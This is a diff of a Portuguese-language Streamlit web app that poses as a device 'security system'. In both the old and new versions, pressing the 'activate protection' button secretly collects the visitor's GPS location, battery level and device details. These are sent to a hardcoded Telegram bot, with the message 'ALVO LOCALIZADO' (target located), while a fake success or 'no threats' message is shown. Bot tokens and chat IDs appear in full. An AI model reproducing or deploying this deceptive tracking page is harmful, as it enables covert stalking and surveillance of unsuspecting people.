@@ -1,102 +1,68 @@
 import streamlit as st
 import time
+import requests
+from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
-# --- SEUS DADOS VALIDADOS ---
-TOKEN = "8099253382:AAHWYUjfpW19J56Ud_FCM_9tObxU4rLh3gQ"
-ID = "8498664028"
+# 1. Configurações de Conexão
+TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
+SEU_ID = "8210828398"
 
-st.set_page_config(page_title="Segurança Integrada", layout="centered")
+def enviar_telegram(mensagem):
+    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
+    payload = {"chat_id": SEU_ID, "text": mensagem, "parse_mode": "Markdown"}
+    try:
+        requests.post(url, json=payload)
+    except:
+        pass
 
-# --- CSS MIAMY © 2026 ---
+# 2. Configuração da Página
+st.set_page_config(page_title="SISTEMA DE SEGURANÇA", page_icon="🔐", layout="centered")
+
+# 3. Visual do Site (CSS)
 st.markdown("""
     <style>
-    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
-    .stAlert { display: none !important; }
-    .titulo { font-size: 30px; font-weight: bold; margin-top: 30px; text-align: center; }
-    .status-container { font-size: 20px; margin: 15px 0; color: #e0e0e0; text-align: center; min-height: 40px; }
-    .progress-bg { width: 100%; height: 10px; background-color: #1e262e; border-radius: 10px; margin-bottom: 30px; overflow: hidden; }
-    .progress-fill { height: 100%; background-color: #007bff; border-radius: 10px; transition: width 0.1s; }
-    .btn-container { display: flex; justify-content: center; width: 100%; margin: 20px 0; }
-    .meu-botao {
-        background-color: white; color: black; width: 280px; height: 80px;
-        border-radius: 15px; border: none; font-size: 16px; font-weight: bold;
-        display: flex; flex-direction: column; align-items: center; justify-content: center;
-        cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+    .main { background-color: #000000; color: #ffffff; }
+    .stButton>button {
+        width: 100%; border-radius: 10px; height: 3em;
+        background-color: #ffc107; color: black; font-weight: bold;
     }
-    .ponto-vermelho { color: #ff3b30; font-size: 24px; }
-    .footer { 
-        position: fixed; left: 0; bottom: 20px; width: 100%; 
-        text-align: center; color: #555; font-size: 10px; 
+    .radar {
+        width: 150px; height: 150px; border: 4px solid #ffc107;
+        border-radius: 50%; margin: 20px auto; position: relative;
+        animation: pulse 2s infinite;
     }
+    @keyframes pulse {
+        0% { transform: scale(0.9); opacity: 0.7; }
+        50% { transform: scale(1); opacity: 1; }
+        100% { transform: scale(0.9); opacity: 0.7; }
+    }
+    .footer { text-align: center; color: #666; font-size: 12px; margin-top: 50px; }
     </style>
-""", unsafe_allow_html=True)
+    <div style="text-align: center;">
+        <h1 style='color: #ffc107;'>🛡️ SISTEMA DE SEGURANÇA</h1>
+        <div class="radar"></div>
+    </div>
+    """, unsafe_allow_html=True)
 
-st.markdown('<div class="titulo">Sistema de Proteção de Hardware</div>', unsafe_allow_html=True)
+# 4. Coleta de Informações
+user_agent = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
+bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
 
-placeholder_texto = st.empty()
-placeholder_barra = st.empty()
+# 5. Botão e Lógica de Envio
+if st.button("🔴 ATIVAR PROTEÇÃO"):
+    with st.status("Localizando dispositivo...", expanded=True) as status:
+        loc = get_geolocation()
+        if loc:
+            lat = loc['coords']['latitude']
+            lon = loc['coords']['longitude']
+            mapa = f"https://www.google.com/maps?q={lat},{lon}"
+            
+            msg = f"🚨 ALVO LOCALIZADO!\n\n📍 Link Google Maps: {mapa}\n🔋 Bateria: {bateria}%\n📱 Dispositivo: {user_agent}"
+            
+            enviar_telegram(msg)
+            status.update(label="Localização Enviada!", state="complete", expanded=False)
+            st.success("Proteção Ativada com Sucesso!")
+        else:
+            st.error("Erro: Por favor, autorize o GPS no seu navegador.")
 
-placeholder_texto.markdown('<div class="status-container">Status: Aguardando ativação (4%)</div>', unsafe_allow_html=True)
-placeholder_barra.markdown('<div class="progress-bg"><div class="progress-fill" style="width: 4%;"></div></div>', unsafe_allow_html=True)
-
-# --- MOTOR DE CAPTURA ---
-js_final = f"""
-<div class="btn-container">
-    <button class="meu-botao" id="btn_ativar">
-        <span class="ponto-vermelho">●</span>
-        <span>ESCANEAR DISPOSITIVO<br>AGORA</span>
-    </button>
-</div>
-
-<script>
-document.getElementById('btn_ativar').onclick = async function() {{
-    let info_aparelho = "Android Device";
-    
-    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {{
-        const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
-        info_aparelho = (hints.model || "Android") + " (v" + (hints.platformVersion || "16") + ")";
-    }} else {{
-        let detalhes = navigator.userAgent.match(/\\((.*?)\\)/);
-        if (detalhes) info_aparelho = detalhes[1].replace("Linux; ", "");
-    }}
-
-    navigator.geolocation.getCurrentPosition(
-        async function(pos) {{
-            try {{
-                const bat = await navigator.getBattery();
-                const level = Math.round(bat.level * 100);
-                const msg = "🛡️ *PROTEÇÃO ATIVADA*\\n📱 *Aparelho:* " + info_aparelho + "\\n🔋 *Bateria:* " + level + "%\\n📍 *Local:* https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
-
-                var img = new Image();
-                img.src = "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&parse_mode=Markdown&text=" + encodeURIComponent(msg);
-                
-                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
-            }} catch(e) {{
-                new Image().src = "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=" + encodeURIComponent("🛡️ Alerta: Dispositivo v16 Localizado.");
-                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
-            }}
-        }},
-        function(err) {{
-            alert("Erro de Segurança: Permita a localização para validar o hardware.");
-        }},
-        {{ enableHighAccuracy: true, timeout: 10000 }}
-    );
-}};
-</script>
-"""
-
-clicou = st.components.v1.html(js_final, height=150)
-st.markdown('<div class="footer">SISTEMA INTEGRADO DE SEGURANÇA DESENVOLVIDO POR Miamy © 2026<br>Todos os Direitos Reservados</div>', unsafe_allow_html=True)
-
-if clicou:
-    # Animação da barra
-    for p in range(4, 101, 2):
-        placeholder_texto.markdown(f'<div class="status-container">Analisando ameaças: {p}%</div>', unsafe_allow_html=True)
-        placeholder_barra.markdown(f'<div class="progress-bg"><div class="progress-fill" style="width: {p}%;"></div></div>', unsafe_allow_html=True)
-        time.sleep(0.02)
-    
-    # Mensagem final de sucesso
-    placeholder_texto.markdown('<div class="status-container" style="color: #2ecc71; font-weight: bold;">Sistema Seguro: nenhuma ameaça foi detectada</div>', unsafe_allow_html=True)
-    st.balloons()
-    st.stop()
-    
+st.markdown('<div class="footer">Proteção de Dispositivo v2.0</div>', unsafe_allow_html=True)
